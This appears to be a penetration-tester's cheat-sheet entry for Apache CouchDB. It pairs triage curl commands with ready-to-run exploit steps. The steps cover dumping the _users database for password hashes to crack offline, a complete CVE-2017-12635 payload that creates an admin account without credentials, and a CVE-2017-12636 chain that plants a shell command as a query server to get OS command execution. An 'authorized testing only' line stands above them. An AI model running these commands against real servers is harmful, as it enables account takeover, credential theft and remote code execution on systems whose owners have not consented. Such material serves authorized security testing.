---
service: couchdb
title: CouchDB
ports: 5984, 6984
aliases: couch, apache-couchdb
---

# CouchDB — quick wins

**When you see it:** 5984/tcp open and `curl http://H:5984/` returns a `{"couchdb":"Welcome"...}`
banner → admin party mode (pre-1.x default) or unauthenticated read. Admin party = any
request is treated as admin. A `401` on `/` means auth IS enforced — pivot to CVE-2017-12635.

> Authorized testing only. Triage is read-only; steps marked ✏️ write to the target — get
> sign-off before creating users or triggering query servers.

## Triage (read-only)
```sh
curl -s http://H:5984/                    # banner + version; 401 = auth enforced
curl -s http://H:5984/_all_dbs            # list all databases
curl -s http://H:5984/_membership         # cluster node names (useful for CVE-2017-12636)
curl -s http://H:5984/_node/_local/_config/admins   # admin accounts (empty = admin party)
nmap -sV --script couchdb-databases,couchdb-stats -p 5984 H
```

## Quick wins

### Enumerate databases and documents (admin party / unauth)
```sh
curl -s http://H:5984/_all_dbs
curl -s http://H:5984/<DBNAME>/_all_docs?include_docs=true
curl -s http://H:5984/<DBNAME>/<DOC_ID>
```
*Why:* in admin party mode every endpoint is open; `_all_docs?include_docs=true` returns
all document payloads in one request. Target `_users` for credential hashes, application
DBs for secrets.

### Dump _users database
```sh
curl -s http://H:5984/_users/_all_docs?include_docs=true | python3 -m json.tool
```
*Why:* `_users` stores all CouchDB user records including PBKDF2 or SHA-1 password hashes
that can be cracked offline.

### CVE-2017-12635 — create admin user without credentials ✏️
*Affects CouchDB < 2.1.1. Erlang and JavaScript JSON parsers handle duplicate keys
differently; the second `roles` array (which is empty) is what Erlang sees, but the
JavaScript layer sees the first array containing `"_admin"`.*
```sh
curl -s -X PUT \
  -H 'Content-Type: application/json' \
  -d '{"type":"user","name":"pwn","roles":["_admin"],"roles":[],"password":"pwn123"}' \
  http://H:5984/_users/org.couchdb.user:pwn
# confirm admin access:
curl -s http://pwn:pwn123@H:5984/_all_dbs
```
*Why:* unauthenticated privilege escalation to CouchDB admin — no existing creds required.
Combine with CVE-2017-12636 below for OS-level RCE.

### CVE-2017-12636 — OS command execution via query server ✏️
*Affects CouchDB < 1.7.1 and < 2.1.1. Requires admin access (use CVE-2017-12635 first).*
```sh
NODE=$(curl -s http://pwn:pwn123@H:5984/_membership | python3 -c \
  "import sys,json; print(json.load(sys.stdin)['all_nodes'][0])")

# 1. Register a malicious query server
curl -s -X PUT \
  "http://pwn:pwn123@H:5984/_node/${NODE}/_config/query_servers/cmd" \
  -H 'Content-Type: application/json' \
  -d '"/bin/bash -c \"id > /tmp/rce.txt\""'

# 2. Create a temp DB and design document to trigger the query server
curl -s -X PUT http://pwn:pwn123@H:5984/rcedb
curl -s -X PUT http://pwn:pwn123@H:5984/rcedb/doc1 \
  -H 'Content-Type: application/json' -d '{"_id":"doc1"}'
curl -s -X PUT http://pwn:pwn123@H:5984/rcedb/_design/rce \
  -H 'Content-Type: application/json' \
  -d '{"language":"cmd","views":{"run":{"map":"x"}}}'

# 3. Trigger execution
curl -s http://pwn:pwn123@H:5984/rcedb/_design/rce/_view/run

# 4. Clean up: delete the DB and query server entry after confirming RCE
```
*Why:* CouchDB executes the query server binary to process map/reduce views; injecting a
shell command runs as the `couchdb` OS user.

## aranum helpers
- `enum-couchdb.sh` — the dispatcher that produced the finding (banner, DB list, admin
  party check).

## Gotchas
- A `401` on `/` blocks all endpoints — auth IS enforced. CVE-2017-12635 still works
  against the `/_users` endpoint even when the root returns 401.
- CouchDB 2.x moved `_config` under `/_node/<node-name>/` — the legacy `/_config/` path
  returns 404 on 2.x targets; use `_membership` to get the node name first.
- CVE-2017-12636 requires the `local.ini` to be writable by the couchdb process; if not,
  the PUT returns `{"error":"badmatch",...}`.
- HTTPS (6984) is sometimes the only exposed port — add `-k` to curl if the cert is
  self-signed.

## Sources
- HackTricks `5984-pentesting-couchdb` (ivanversluis/pentest-hacktricks mirror);
  CVE-2017-12635 write-up (justi.cz); CVE-2017-12636 (vulhub/vulhub + EDB-44913);
  0xdf HTB Canape write-up.
